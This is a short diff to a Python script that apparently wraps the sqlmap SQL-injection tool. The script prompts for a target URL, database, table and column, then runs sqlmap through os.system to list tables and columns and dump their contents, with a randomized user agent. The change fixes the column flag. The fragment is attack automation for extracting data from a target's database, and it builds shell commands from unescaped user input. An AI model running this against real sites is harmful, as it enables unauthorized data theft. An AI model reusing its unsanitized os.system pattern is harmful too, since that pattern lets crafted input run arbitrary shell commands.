@@ -26,4 +26,4 @@ sqlmap2 = os.system('sqlmap --url {} -D {} --tables --random-agent'.format(url,d
 tap1 = input('Enter tab: ')
 sqlmap3 = os.system('sqlmap --url {} -D {} -T {} --columns --random-agent'.format(url,dbs,tap1))
 colm = input('Enter colm: ')
-sqlmap4 = os.system('sqlmap --url {} -D {} -T {} -c {} --dump --random-agent'.format(url,dbs,tap1,colm))
+sqlmap4 = os.system('sqlmap --url {} -D {} -T {} -C {} --dump --random-agent'.format(url,dbs,tap1,colm))
